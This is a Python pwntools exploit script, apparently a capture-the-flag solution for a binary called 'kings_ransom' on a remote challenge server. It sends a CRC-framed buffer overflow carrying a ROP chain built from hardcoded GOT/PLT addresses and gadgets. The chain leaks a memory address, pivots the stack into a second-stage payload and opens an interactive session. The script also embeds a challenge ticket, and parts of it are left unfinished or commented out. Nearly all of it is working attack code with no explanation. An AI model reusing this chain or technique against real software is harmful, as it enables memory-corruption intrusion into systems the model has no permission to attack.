#!/usr/bin/env python3
from pwn import *
import struct
TARGET = 'wealthy-rock.satellitesabove.me'
PORT = 5010
TICKET = 'ticket{uniform961832romeo2:GLrOqZLaDhJe0OkbXkWK6Ub026CtdWcNbENRKjsmwWz_iKWp60GCpPagzbE5mIzJvg}'

LOCAL = False

def to_unsigned(bits, x):
    return x & ((1<<bits)-1)

def to_signed(bits, x):
    offset = 1<<(bits-1)
    return to_unsigned(bits, x + offset) - offset 

def calc_crc(buf):
    res = 0x1d0f
    for c in buf:
        res = (res ^ (c << 8))
        for i in range(8):
            res = to_signed(16, res)
            if res >= 0:
                res = (res*2)
            else:
                res = ((2*res) ^ 0xa02b)
    return res & 0xffff

# TODO
if LOCAL:
	io = process('./kings_ransom')
	gdb.attach(io)
else:
	io = remote(TARGET, PORT)
	io.recvline()
	io.sendline(TICKET)
	io.recvuntil('Service on tcp:')
	hp = io.recvline()
	io = remote(hp.split(b':')[0], int(hp.split(b':')[1]))

def construct_struct(row, col, length, content):
	io.send(b'\x55\xaa' + p16(length) + p16(calc_crc(content)) + bytes([row, col]) + content)

free_got = 0x404018
write_got = 0x404020
mmap_got = 0x404028
memset_got = 0x404030
close_got = 0x404038
read_got = 0x404040
memcpy_got = 0x404048
malloc_got = 0x404050
open_got = 0x404058
exit_got = 0x404060
free_plt = 0x4010d4
write_plt = 0x4010e4
mmap_plt = 0x4010f4
memset_plt = 0x401104
close_plt = 0x401114
read_plt = 0x401124
memcpy_plt = 0x401134
malloc_plt = 0x401144
open_plt = 0x401154
exit_plt = 0x401164
add_callback = 0x4015DB
write_buf = 0x4016AD
read_buf = 0x401726

libc_free_offset = 0x9d850
libc_system_offset = 0x55410


bss_buf = 0x4040A0

poprdi = 0x401dc3
ret = 0x401dc4
leave_ret = 0x40132e
poprsi_r15 = 0x401dc1
g_rwx = 0x0404088
flag1_str = 0x402004
flag2_str = 0x402010

#context.log_level = 'debug'
#construct_struct(0, 0, 400, b"PING")

#payload = b"A" * 20 + p64(poprdi) + p64(read_plt) + p64(poprsi_r15) + p64(2) + p64(0xdeadbeef) + p64(add_callback)
#payload += p64(poprdi) + p64(1) + p64(poprsi_r15) + p64(g_rwx) + p64(0xdeadbeef) + p64(write_plt)
#payload += p64(0xcafebabe)
#+ p64(poprdi) + p64(0x404000) + p64(poprsi_r15) + p64(0x118) + p64(0xdeadbeef) + p64(write_buf)

payload = b"A" * 12 + p64(bss_buf)
payload += p64(poprdi) + p64(g_rwx) + p64(poprsi_r15) + p64(0xff) + p64(0xdeadbeef) + p64(write_buf)
payload += p64(poprdi) + p64(bss_buf) + p64(poprsi_r15) + p64(0x50) + p64(0xdeadbeef) + p64(read_buf)
payload += p64(leave_ret) + p64(bss_buf)

construct_struct(1, 1, len(payload), payload)

data = io.recvn(0xff)
print(data)
mapaddr = u64(data[0:8])

stage2 = b'A' * 8 + p64(poprdi) + p64(mapaddr) + p64(poprsi_r15) + p64(0x30) + p64(0xdeadbeef) + p64(write_buf)
stage2 = stage2.ljust(0x50, b'A')
io.send(stage2)


io.interactive()